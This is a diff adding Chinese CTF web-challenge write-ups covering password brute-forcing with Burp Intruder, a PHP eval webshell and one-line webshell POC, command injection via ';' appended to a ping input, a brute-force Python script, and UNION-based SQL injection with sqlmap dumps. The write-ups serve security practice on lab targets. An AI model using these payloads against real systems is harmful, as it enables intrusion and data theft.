@@ -91,3 +91,109 @@ for i in slist:
 
 ???+ tip
     使用 **Burp Suite** 拦截修改时, 直接在`Raw`中添加无效, 需要在`Headers`中点击`Add`添加.
+
+## 0x09_weak_auth
+
+> 提示弱密码, 登录表单无验证码, 攻击思路: 暴力破解
+
+使用`Burp Suite`拦截登录请求, 发送到`Intruder`, Attack type设置为`Sniper`, 添加占位符到`password`参数, Payload set 1选择Payload type为`Simple list`, 下载[弱密码字典](https://github.com/rootphantomer/Blasting_dictionary), Load到Payload Options中, 点击右上角`Start attack`.
+
+- Sniper: 使用单个payload set, 对每个占位符轮流设置值.
+- Battering ram: 使用单个payload set, 同时将所有占位符设置为同一个payload.
+- Pitchfork: 使用多个payload set, 多个相关联的集合同时迭代.
+- Cluster bomb: 使用多个payload set, 固定第一个payload迭代第二个payload set.
+
+迭代到`123456`发现response的Length不同, 查看发现已登录成功, get flag.
+
+## 0x0A_webshell
+
+php代码把POST请求中的参数`shell`作为eval执行, 即可控制`shell`参数调用`system()`执行系统命令, 因此通过`HackBar`插件, 发送POST请求, 并将`shell`参数设置为`system('id')`执行返回`uid=33(www-data) gid=33(www-data) groups=33(www-data)`, 说明执行成功, 继续设置为`system('ls')`执行返回`flag.txt index.php`, 说明该目录下存在`flag.txt`, 继续设置为`system('cat flag.txt')`执行返回flag.
+
+???+ danger "POC"
+    存在上传漏洞的web应用中, 上传一句话webshell: `<?php @eval($_POST['shell']); ?>`, 然后通过蚁剑拿到shell.
+
+???+ success "工具"
+    - [蚁剑AntSword](https://github.com/AntSwordProject/antSword/releases), webshell管理工具.
+    - [快速入门](https://doc.u0u.us/zh-hans/getting_started/index.html)
+
+## 0x0B_command_execution
+
+输入IP地址`1.1.1.1`, 返回命令执行结果:  
+```
+ping -c 3 1.1.1.1
+PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.
+
+--- 1.1.1.1 ping statistics ---
+3 packets transmitted, 0 received, 100% packet loss, time 2004ms
+```
+
+说明将用户输入的IP地址拼接到`ping -c 3 `后面执行, 构造命令分隔符`1.1.1.1;id`输入并执行, 返回`uid=33(www-data) gid=33(www-data) groups=33(www-data)`, 继续执行`1.1.1.1;ls`, 发现只有一个`index.php`, 执行`1.1.1.1;find / -name "*flag*"`, 查找到flag在`/home/flag.txt`, 执行`1.1.1.1;cat /home/flag.txt`拿到flag.
+
+???+ example "其他命令拼接符"
+    - `|`, 将前一个命令的结果作为后一个命令的输入
+    - `&&`, 前一个命令执行成功后执行后一个命令
+
+## 0x0C_simple_php
+
+通过控制GET参数`a=a&b=1235a`显示flag.
+
+## 001_ics-06
+
+只有`报表中心`菜单可以跳转到`index.php`, 选择日期点确认没有反应, 查看源码, cookie未果.
+
+URL中自动携带参数`id=1`, 将`id=1`改成`id=flag`, 自动跳回到`id=1`, 改成`id=2`, 不会自动跳转, 但内容无变化.
+
+暴力破解, `Payload set 1`的`Payload type`选择`Numbers`, 范围从`0`到`9999`.
+
+???+ tip
+    使用社区版的Burp Suite暴力破解线程被限制为1, 速度太慢, 自己写python脚本.
+
+    ```python
+    import requests
+    import time
+
+    start = time.time()
+    for i in range(2300, 3000):  # 不浪费时间, 从2000开始
+        print("time cost %d, i is %d" % (time.time()-start, i))
+        r = requests.get("http://111.198.29.45:43813/index.php?id=%d" % i)
+        r.encoding = "utf-8"
+        reslen = len(r.text)
+        if reslen != 1545:  # 正常响应长度是1545
+            print(reslen)
+            print(r.text)
+            break
+    ```
+
+## 002_NewsCenter
+
+1. 提交表单发送请求, 参数`search`可控, 使用`flag' or 1=1 -- `测试存在SQL注入
+1. 使用`' union select 1,2,3 #`测试出存在3列
+1. 使用`' and 0 union select 1,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS #`查询出数据库名news, 表名news, secret_table
+1. 使用`' and 0 union select 1,column_name,data_type from information_schema.columns where table_name='news'#`查询出列名和数据类型id, int, title, varchar, content, text
+1. 使用`' and 0 union select id,title,content from news #`查询news表发现没用
+1. 使用`' and 0 union select 1,column_name,data_type from information_schema.columns where table_name='secret_table'#`查询列名和数据类型id, int, fl4g, varchar
+1. 使用`' and 0 union select 1,id,fl4g from secret_table #`拿到flag
+
+???+ success "工具"
+    [sqlmap](http://sqlmap.org/): 自动化SQL注入工具
+
+    1. 测试数据库类型及是否存在注入, 获取列数`python3 sqlmap.py -u "http://111.198.29.45:53232/index.php" --data "search=df"`
+    1.获取注入点
+
+    sqlmap -u http://192.168.100.161:53459 --data "search=df"
+
+    2.获取数据库信息
+
+    sqlmap -u http://192.168.100.161:53459 --data "search=df" -dbs
+
+    3.获取库内表信息
+
+    sqlmap -u http://192.168.100.161:53459 --data "search=df" -D news --tables
+
+    4.获取表内字段信息
+
+    sqlmap -u http://192.168.100.161:53459 --data "search=df" -D news -T secret_table --columns
+
+    5.获取字段内容，得到flag
+
+    sqlmap -u http://192.168.100.161:53459 --data "search=df" -D news -T secret_table -C "fl4g" --dump
